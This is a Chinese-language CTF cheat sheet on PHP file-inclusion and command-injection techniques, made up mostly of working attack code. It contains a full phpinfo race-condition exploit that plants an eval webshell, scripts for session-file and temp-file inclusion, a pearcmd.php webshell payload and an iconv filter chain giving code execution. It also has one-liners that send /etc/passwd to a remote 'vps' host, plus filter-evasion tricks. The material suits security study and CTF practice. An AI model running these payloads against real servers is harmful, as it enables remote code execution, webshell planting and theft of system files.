[Phar的一些利用姿势](https://xz.aliyun.com/t/3692)
[利用 phar 拓展 php 反序列化漏洞攻击面](https://paper.seebug.org/680/)

**zip://伪协议**
用法：`?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名] zip://xxx.png#shell.php`
条件： PHP > =5.3.0，注意在windows下测试要5.3.0<PHP<5.4 才可以 #在浏览器中要编码为%23，否则浏览器默认不会传输特殊字符。

**当compress.zlib加在任何其他协议之前，仍然会保持其他协议的功能**
>1. data协议的格式
data协议的格式为`data: [ mediatype ] [ ";charset" ] [ ";base64" ] , data`。其中charset，base64可选;data可用url编码。然而一个在php中，一个合法的data协议只需要满足`data:xxx/xxx;test=test;%23`就行。
>2. data协议的base64编码
由于filter_var很敏感，遇到一些空格报错，所以可以利用data协议的base64绕过。
`compress.zlib://data:@127.0.0.1/?;base64,(base64编码后的payload)`

[php 伪协议](https://www.cnblogs.com/2019gdiceboy/p/11777299.html)
[PHP伪协议总结](https://segmentfault.com/a/1190000018991087)

大佬文章：
[Web安全实战系列：文件包含漏洞](https://www.freebuf.com/articles/web/182280.html)
[bypass-RFI限制的一些思路](https://www.redteaming.top/2019/05/15/bypass-RFI%E9%99%90%E5%88%B6%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF/)

#### 文件包含
可以fuzz下：[文件读取漏洞路径收集](https://blog.csdn.net/qq_33020901/article/details/78810035)

在php中，`require_once`在调用时php会检查该文件是否已经被包含过，如果是则不会再次包含
```php
<?php
error_reporting(E_ALL);
require_once('flag.php');
highlight_file(__FILE__);
if(isset($_GET['content'])) {
    $content = $_GET['content'];
    require_once($content);
}
```
绕过技巧：
```
php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
```
##### phpinfo与条件竞争
[LFI WITH PHPINFO() ASSISTANCE](https://dl.packetstormsecurity.net/papers/general/LFI_With_PHPInfo_Assitance.pdf)
我们对任意一个PHP文件发送一个上传的数据包时，不管这个PHP服务后端是否有处理`$_FILES`的逻辑，PHP都会将用户上传的数据先保存到一个临时文件中，这个文件一般位于系统临时目录，文件名是php开头，后面跟6个随机字符；在整个PHP文件执行完毕后，这些上传的临时文件就会被清理掉
phpinfo页面中会输出这次请求的所有信息，包括`$_FILES`变量的值，其中包含完整文件名
![](https://img-blog.csdnimg.cn/fcde1b87713842a38fe5802474f1ab10.png)
所以此时需要利用到条件竞争(Race Condition)，原理也好理解——我们用两个以上的线程来利用，其中一个发送上传包给phpinfo页面，并读取返回结果，找到临时文件名；第二个线程拿到这个文件名后马上进行包含利用
```python
#!/usr/bin/python 
import sys
import threading
import socket

def setup(host, port):
    TAG="Security Test"
    PAYLOAD="""%s\r
<?php file_put_contents('/tmp/g', '<?=eval($_REQUEST[1])?>')?>\r""" % TAG
    REQ1_DATA="""-----------------------------7dbff1ded0714\r
Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
Content-Type: text/plain\r
\r
%s
-----------------------------7dbff1ded0714--\r""" % PAYLOAD
    padding="A" * 5000
    REQ1="""POST /phpinfo.php?a="""+padding+""" HTTP/1.1\r
Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""+padding+"""\r
HTTP_ACCEPT: """ + padding + """\r
HTTP_USER_AGENT: """+padding+"""\r
HTTP_ACCEPT_LANGUAGE: """+padding+"""\r
HTTP_PRAGMA: """+padding+"""\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: %s\r
Host: %s\r
\r
%s""" %(len(REQ1_DATA),host,REQ1_DATA)
    #modify this to suit the LFI script   
    LFIREQ="""GET /lfi.php?file=%s HTTP/1.1\r
User-Agent: Mozilla/4.0\r
Proxy-Connection: Keep-Alive\r
Host: %s\r
\r
\r
"""
    return (REQ1, TAG, LFIREQ)

def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    

    s.connect((host, port))
    s2.connect((host, port))

    s.send(phpinforeq)
    d = ""
    while len(d) < offset:
        d += s.recv(offset)
    try:
        i = d.index("[tmp_name] =&gt; ")
        fn = d[i+17:i+31]
    except ValueError:
        return None

    s2.send(lfireq % (fn, host))
    d = s2.recv(4096)
    s.close()
    s2.close()

    if d.find(tag) != -1:
        return fn

counter=0
class ThreadWorker(threading.Thread):
    def __init__(self, e, l, m, *args):
        threading.Thread.__init__(self)
        self.event = e
        self.lock =  l
        self.maxattempts = m
        self.args = args

    def run(self):
        global counter
        while not self.event.is_set():
            with self.lock:
                if counter >= self.maxattempts:
                    return
                counter+=1

            try:
                x = phpInfoLFI(*self.args)
                if self.event.is_set():
                    break                
                if x:
                    print "\nGot it! Shell created in /tmp/g"
                    self.event.set()
                    
            except socket.error:
                return
    

def getOffset(host, port, phpinforeq):
    """Gets offset of tmp_name in the php output"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.send(phpinforeq)
    
    d = ""
    while True:
        i = s.recv(4096)
        d+=i        
        if i == "":
            break
        # detect the final chunk
        if i.endswith("0\r\n\r\n"):
            break
    s.close()
    i = d.find("[tmp_name] =&gt; ")
    if i == -1:
        raise ValueError("No php tmp_name in phpinfo output")
    
    print "found %s at %i" % (d[i:i+10],i)
    # padded up a bit
    return i+256

def main():
    
    print "LFI With PHPInfo()"
    print "-=" * 30

    if len(sys.argv) < 2:
        print "Usage: %s host [port] [threads]" % sys.argv[0]
        sys.exit(1)

    try:
        host = socket.gethostbyname(sys.argv[1])
    except socket.error, e:
        print "Error with hostname %s: %s" % (sys.argv[1], e)
        sys.exit(1)

    port=80
    try:
        port = int(sys.argv[2])
    except IndexError:
        pass
    except ValueError, e:
        print "Error with port %d: %s" % (sys.argv[2], e)
        sys.exit(1)
    
    poolsz=10
    try:
        poolsz = int(sys.argv[3])
    except IndexError:
        pass
    except ValueError, e:
        print "Error with poolsz %d: %s" % (sys.argv[3], e)
        sys.exit(1)

    print "Getting initial offset...",  
    reqphp, tag, reqlfi = setup(host, port)
    offset = getOffset(host, port, reqphp)
    sys.stdout.flush()

    maxattempts = 1000
    e = threading.Event()
    l = threading.Lock()

    print "Spawning worker pool (%d)..." % poolsz
    sys.stdout.flush()

    tp = []
    for i in range(0,poolsz):
        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))

    for t in tp:
        t.start()
    try:
        while not e.wait(1):
            if e.is_set():
                break
            with l:
                sys.stdout.write( "\r% 4d / % 4d" % (counter, maxattempts))
                sys.stdout.flush()
                if counter >= maxattempts:
                    break
        print
        if e.is_set():
            print "Woot!  \m/"
        else:
            print ":("
    except KeyboardInterrupt:
        print "\nTelling threads to shutdown..."
        e.set()
    
    print "Shuttin' down..."
    for t in tp:
        t.join()

if __name__=="__main__":
    main()
```
##### session文件包含
PHP中可以通过session progress功能实现临时文件的写入，这种利用方式需要满足下面几个条件：
>目标环境开启了`session.upload_progress.enable`选项
发送一个文件上传请求，其中包含一个文件表单和一个名字是`PHP_SESSION_UPLOAD_PROGRESS`的字段
请求的Cookie中包含Session ID

注意的是，如果我们只上传一个文件，这里也是不会遗留下Session文件的，所以表单里必须有两个以上的文件上传
所以，默认情况下，我们需要在session文件被清理前利用它，这也会用到条件竞争
```python
import io
import requests
import threading
sessID = 'flag'
url = 'http://a7646920-aa2f-46f4-bd43-00e8be7a1c6e.node3.buuoj.cn/'
def write(session):
    while True:
        f = io.BytesIO(b'a'*256*1) #建议正常这个填充数据大一点
        response = session.post(
            url,
            cookies={'PHPSESSID': sessID},
            data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php system("cat *.php");?>'},
            files={'file': ('a.txt', f)}
            )
def read():
    while True:
        response = session.get(url+'?file=/tmp/sess_{}'.format(sessID))
        if 'flag{' in response.text:
            print(response.text)
            break
session = requests.session()
write = threading.Thread(target=write, args=(session,))
write.daemon = True #当daemon为True时，父线程在运行完毕后，子线程无论是否正在运行，都会伴随主线程一起退出。
write.start()
read()
```
获取session文件路径：
```
1、session文件的保存路径可以在phpinfo的session.save_path看到
2、默认路径：
/var/lib/php/sess_PHPSESSID
/var/lib/php5/sess_PHPSESSID
/tmp/sess_PHPSESSID
/tmp/sessions/sess_PHPSESSID
```
session的文件名格式为`sess_[phpsessid]`。而phpsessid在发送的请求的cookie字段中可以看到

##### LFI+php7崩溃
这个Bug在7.1.20以后被修复
php7 segment fault特性：
```
?file=php://filter/string.strip_tags=/etc/passwd
?file=php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA
```
这样的方式，使php执行过程中出现Segment Fault，这样如果在此同时上传文件，那么临时文件就会被保存在/tmp目录，不会被删除
```python
import requests
import string

def upload_file(url, file_content):
    files = {'file': ('daolgts.jpg', file_content, 'image/jpeg')}
    try:
        requests.post(url, files=files)
    except Exception as e:
        print e

charset = string.digits+string.letters
webshell = '<?php eval($_REQUEST[cmd]);?>'.encode("base64").strip()
file_content = '<?php if(file_put_contents("/tmp/shell", base64_decode("%s"))){echo "success";}?>' % (webshell)

url="http://192.168.211.146/lfi.php"
parameter="file"
payload1="php://filter/string.strip_tags/resource=/etc/passwd"
payload2=r"php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA"
lfi_url = url+"?"+parameter+"="+payload1
length = 6
times = len(charset) ** (length / 2)
for i in xrange(times):
    print "[+] %d / %d" % (i, times)
    upload_file(lfi_url, file_content)
```
爆破临时文件：
```php
import requests
import string

charset = string.digits + string.letters
base_url="http://192.168.211.146/lfi.php"
parameter="file"

for i in charset:
	for j in charset:
		for k in charset:
			for l in charset:
				for m in charset:
					for n in charset:
						filename = i + j + k + l + m + n
						url = base_url+"?"+parameter+"=/tmp/php"+filename
						print url
						try:
							response = requests.get(url)
							if 'success' in response.content:
								print "[+] Include success!"
								print "url:"+url
								exit()
						except Exception as e:
							print e
```

##### pearcmd.php的巧妙利用
需要开启`register_argc_argv`这个配置
pear中的命令config-create，这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中
```
?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php
```

这里我使用的官方提供的`php:7.4-apache`，首先运行docker：
```bash
docker run -d --name web -p 8080:80 -v $(pwd):/var/www/html php:7.4-apache
```
运行我们的payload
```
?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=@eval($_POST[0])?>+/tmp/1.php
```
![](https://img-blog.csdnimg.cn/ae9ef00e712c4145b43e354c53e5d263.png)
成功执行命令
![](https://img-blog.csdnimg.cn/9dc1699ab9874642b4919941076f262a.png)

还可以尝试别的路径：`/usr/share/php/pearcmd.php`


参考：[Docker PHP裸文件本地包含综述](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html)
[文件包含&奇技淫巧](https://zhuanlan.zhihu.com/p/62958418)
[LFItoRCE利用总结 ](https://www.anquanke.com/post/id/177491)

##### hxp[Includer's revenge]
```php
<?php ($_GET['action'] ?? 'read' ) === 'read' ? readfile($_GET['file'] ?? 'index.php') : include_once($_GET['file'] ?? 'index.php');
```
因为最终的 base64 字符串，是由 iconv 相对应的编码规则生成的，所以我们最好通过已有的编码规则来适当地匹配自己想要的 webshell ，比如
```php
<?=`$_GET[0]`;;?>
```
以上 payload 的 base64 编码为 `PD89YCRfR0VUWzBdYDs7Pz4=` ，而如果只使用了一个分号，则编码结果为 `PD89YCRfR0VUWzBdYDs/Pg==` ，这里 7 可能相对于斜杠比较好找一些，也可能是 exp 作者没有 fuzz 或者找到斜杠的生成规则，所以作者这里使用了两个分号避开了最终 base64 编码中的斜杠
最后的exp:
```php
<?php
$base64_payload = "PD89YCRfR0VUWzBdYDs7Pz4";
$conversions = array(
    'R' => 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2',
    'B' => 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2',
    'C' => 'convert.iconv.UTF8.CSISO2022KR',
    '8' => 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2',
    '9' => 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB',
    'f' => 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213',
    's' => 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61',
    'z' => 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS',
    'U' => 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932',
    'P' => 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213',
    'V' => 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5',
    '0' => 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2',
    'Y' => 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2',
    'W' => 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2',
    'd' => 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2',
    'D' => 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2',
    '7' => 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2',
    '4' => 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2'
);

$filters = "convert.base64-encode|";
# make sure to get rid of any equal signs in both the string we just generated and the rest of the file
$filters .= "convert.iconv.UTF8.UTF7|";

foreach (str_split(strrev($base64_payload)) as $c) {
    $filters .= $conversions[$c] . "|";
    $filters .= "convert.base64-decode|";
    $filters .= "convert.base64-encode|";
    $filters .= "convert.iconv.UTF8.UTF7|";
}
$filters .= "convert.base64-decode";

$final_payload = "php://filter/{$filters}/resource=/etc/passwd";

echo $final_payload;
var_dump(file_get_contents($final_payload));
```
![](https://img-blog.csdnimg.cn/09f838b56236430db75bb88642186043.png)
使用工具：[https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT](https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT)
真的太强了，这个payload：
```php
file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP869.CSIBM1163|convert.iconv.ISO2022KR.UNICODE|convert.iconv.LATIN3.NAPLPS|convert.iconv.ISO-IR-156.UNICODEBIG|convert.iconv.ISO885915.CSISO90|convert.iconv.ISO-IR-156.8859_9|convert.iconv.CSISOLATINGREEK.MSCP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP922.CSISOLATIN5|convert.iconv.ISO2022KR.UTF-32|convert.iconv.IBM912.ISO-IR-156|convert.iconv.ISO-IR-99.CSEUCPKDFMTJAPANESE|convert.iconv.8859_9.ISO_6937-2|convert.iconv.CSISO99NAPLPS.CP902|convert.iconv.ISO-IR-143.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.PT154.874|convert.iconv.CSISO2022KR.UTF-32|convert.iconv.CSIBM901.ISO_6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.CSISO2022KR.UTF16|convert.iconv.LATIN6.CSUCS4|convert.iconv.UTF-32BE.ISO_6937-2:1983|convert.iconv.ISO-IR-111.CSWINDOWS31J|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.CSA_T500.EUCJP-WIN|convert.iconv.CP855.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.CSISO90.UCS-4BE|convert.iconv.OSF00010004.UTF32|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.CSISO90.ISO-10646/UTF-8|convert.iconv.BALTIC.SHIFT_JISX0213|convert.iconv.CP949.CP1361|convert.iconv.CSISOLATIN2.T.61|convert.iconv.IBM932.BIG-5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.ISO-IR-156.CSUCS4|convert.iconv.KOI8-T.CSIBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.NAPLPS.UCS-4|convert.iconv.ISO_8859-4.T.618BIT|convert.iconv.CSISO103T618BIT.BIG5-HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP869.CSIBM1163|convert.iconv.ISO2022KR.UNICODE|convert.iconv.LATIN3.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP869.CSIBM1163|convert.iconv.ISO2022KR.UNICODE|convert.iconv.LATIN3.NAPLPS|convert.iconv.ISO-IR-156.UNICODEBIG|convert.iconv.ISO885915.CSISO90|convert.iconv.BIGFIVE.CSIBM943|convert.iconv.LATIN6.WINDOWS-1258|convert.iconv.CP1258.CSISO103T618BIT|convert.iconv.NAPLPS.OSF10020359|convert.iconv.WINDOWS-1256.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-GR.UNICODE|convert.iconv.ISO_8859-14:1998.UTF32BE|convert.iconv.OSF00010009.ISO2022JP2|convert.iconv.UTF16.ISO-10646/UTF-8|convert.iconv.UTF-16.UTF8|convert.iconv.ISO_8859-14:1998.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP869.CSIBM1163|convert.iconv.ISO2022KR.UNICODE|convert.iconv.LATIN3.NAPLPS|convert.iconv.ISO-IR-156.UNICODEBIG|convert.iconv.ISO885915.CSISO90|convert.iconv.BIGFIVE.CSIBM943|convert.iconv.LATIN6.WINDOWS-1258|convert.iconv.CP1258.CSISO103T618BIT|convert.iconv.NAPLPS.OSF10020359|convert.iconv.WINDOWS-1256.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP922.CSISOLATIN5|convert.iconv.ISO2022KR.UTF-32|convert.iconv.IBM912.ISO-IR-156|convert.iconv.ISO-IR-103.CSEUCPKDFMTJAPANESE|convert.iconv.OSF00010002.UNICODE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.ISO-IR-99.CSEUCPKDFMTJAPANESE|convert.iconv.CSEUCKR.UTF-32|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.ISO-IR-156.CSUCS4|convert.iconv.KOI8-T.CSIBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.CSISO90.UCS-4BE|convert.iconv.OSF00010004.UTF32|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO-IR-6.ISO646-DE|convert.iconv.ISO2022KR.UTF32|convert.iconv.MAC-UK.ISO-10646|convert.iconv.UCS-4BE.855|convert.iconv.ISO88599.CSISO90|convert.iconv.ISO_6937:1992.10646-1:1993|convert.iconv.CP773.UNICODE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UK.852|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP922.CSISOLATIN5|convert.iconv.ISO2022KR.UTF-32|convert.iconv.IBM912.ISO-IR-156|convert.iconv.ISO-IR-99.CSEUCPKDFMTJAPANESE|convert.iconv.8859_9.ISO_6937-2|convert.iconv.ISO6937.UCS-2LE|convert.iconv.CP864.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP869.CSIBM1163|convert.iconv.ISO2022KR.UNICODE|convert.iconv.LATIN3.NAPLPS|convert.iconv.ISO-IR-156.UNICODEBIG|convert.iconv.ISO885915.CSISO90|convert.iconv.ISO-IR-156.8859_9|convert.iconv.CSISOLATINGREEK.MSCP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.ISO-IR-156.CSUCS4|convert.iconv.KOI8-T.CSIBM932|convert.iconv.CSIBM932.IBM866NAV|convert.iconv.IBM775.UTF32|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.ISO-IR-156.CSUCS4|convert.iconv.KOI8-T.CSIBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.ISO-IR-156.CSUCS4|convert.iconv.KOI8-T.CSIBM932|convert.iconv.CSIBM932.IBM866NAV|convert.iconv.IBM775.UTF32|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO-IR-6.ISO646-DE|convert.iconv.ISO2022KR.UTF32|convert.iconv.MAC-UK.ISO-10646|convert.iconv.UCS-4BE.855|convert.iconv.ISO88599.CSISO90|convert.iconv.ISO_6937:1992.10646-1:1993|convert.iconv.CP773.UNICODE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.ISO-IR-156.OSF00010104|convert.iconv.CP860.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO-IR-6.ISO646-DE|convert.iconv.ISO2022KR.UTF32|convert.iconv.MAC-UK.ISO-10646|convert.iconv.UTF-32BE.MS936|convert.iconv.8859_5.UTF32|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP922.CSISOLATIN5|convert.iconv.ISO2022KR.UTF-32|convert.iconv.IBM912.ISO-IR-156|convert.iconv.ISO-IR-99.CSEUCPKDFMTJAPANESE|convert.iconv.8859_9.ISO_6937-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-GR.UNICODE|convert.iconv.ISO_8859-14:1998.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP869.CSIBM1163|convert.iconv.ISO2022KR.UNICODE|convert.iconv.LATIN3.NAPLPS|convert.iconv.ISO-IR-90.UTF16LE|convert.iconv.IBM874.UNICODEBIG|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.ISO-IR-103.ISO-IR-209|convert.iconv.8859_5.CSISO2022JP2|convert.iconv.ISO-2022-JP-3.IBM-943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.CSISO2022KR.UTF16|convert.iconv.LATIN6.CSUCS4|convert.iconv.UTF-32BE.ISO_6937-2:1983|convert.iconv.ISO-IR-111.CSWINDOWS31J|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/etc/passwd&1=phpinfo();
```
[hxp CTF 2021 - A New Novel LFI](https://tttang.com/archive/1384/)
[https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)
[PHP LFI with Nginx Assistance](https://bierbaumer.net/security/php-lfi-with-nginx-assistance/)
[hxp CTF 2021 - The End Of LFI?](https://tttang.com/archive/1395/)


### 命令执行

换行符     %0a
连续指令   ；
后台进程 &
管道符 |

**命令分隔符：**
linux中：`%0a 、%0d 、; 、& 、| 、&&、||`
windows中：`%0a、& 、| 、%1a(一个神奇的角色，作为.bat文件中的命令分隔符)`

windows:

|命令格式| 含义 |
|--|--|
|command1 & command2  | 先后执行command1和command2，无论command1是否执行成功|
command1 && command2|先后执行command1和command2，只有command1执行成功时才执行command2
command1 \|\| command2|先后执行command1和command2，只有command1执行失败时才执行command2
command \| command2|  \| 是管道符，将command1执行的结果传递给command2

linux:

|命令格式| 含义 |
|--|--|
|command1 ; command2  | 先后执行command1和command2，无论command1是否执行成功|
command1 && command2|先后执行command1和command2，只有command1执行成功时才执行command2
command1 \|\| command2|先后执行command1和command2，只有command1执行失败时才执行command2
command1 \| command2|  \| 是管道符，将command1执行的结果传递给command2


**空格代替：
<>符号
< 符号
$IFS
${IFS}
$IFS$9
%09，%0b，%0c，%20用于url传递**

whidows下，可以用`%ProgramFiles:~10,1%`，%ProgramFiles%一般为 C:\Program Files

`a=l;b=s;$a$b等于ls`
base64编码：   `echo d2hvYW1p|base64 -d`   d2hvYW1p的base64编码为whoami
![](https://img-blog.csdnimg.cn/20200829152321418.png#pic_center)

16进制： `echo "0x636174202e2f666c6167" |xxd -r -p`
![](https://img-blog.csdnimg.cn/20200829152023261.png#pic_center)
`$(printf "\x77\x68\x6f\x61\x6d\x69")`
![](https://img-blog.csdnimg.cn/20200829152241308.png#pic_center)
8进制：`$(printf "\167\150\157\141\155\151")`
![](https://img-blog.csdnimg.cn/20200829152434478.png#pic_center)

**下列例子是输出反斜杠 / :**
>echo \${PATH:0:1}
echo \`expr$IFS\substr\\$IFS\\$(pwd)\\$IFS\1\\$IFS\1\`
echo \$(expr\${IFS}substr\${IFS}\$PWD\${IFS}1${IFS}1)\
expr\${IFS}substr\${IFS}\$SESSION_MANAGER\${IFS}6${IFS}1
echo $(cd ..&&cd ..&&cd ..&&cd ..&&pwd)

无回显技巧(exec):
```bash
ping;cp 12345.php 2.txt  再访问2.txt
ls /|tee 1.txt
tar cvf index .
tar -cvf index . 打包目录下的所有文件为index，下载即可
echo "<?php @eval(\$_POST[cmd]);?>" >shell.php
printf "\145\143\150\157\40\42\74\77\160\150\160\40\100\145\166\141\154\50\134\44\137\120\117\123\124\133\143\155\144\135\51\73\77\76\42\40\76\163\150\145\154\154\56\160\150\160"|sh
curl vps -d "@/etc/passwd"
curl vps -d `whoami`
curl vps -T "/etc/passwd"
```

一些小技巧
```bash
$a=ag.php;$b=fl;cat$IFS$9$b$a
cat$IFS$9`ls`
echo$IFS$9Y2F0IGZsYWcucGhw=$IFS$9|$IFS$9base64$IFS$9-d$IFS$9|sh
/bin/base64 flag.php：/???/????64 ????.???
/bin/x11/base32 flag.php：/???/?11/????32 ????.???
/usr/bin/bzip2 flag.php：/???/???/????2 ????.???


列目录命令: du -a .
cat可用 more${IFS}`ls`代替，还可以用ca\t fl\ag,ca""t flag,ca''t flag,sort flag,od -c flag,sed -n '1p' flag
使用通配符：/???/??t fl??
查看文件头几行： head 文件名
查看文件后几行： tail 文件名
反向查看： tac 文件名
base64 文件名
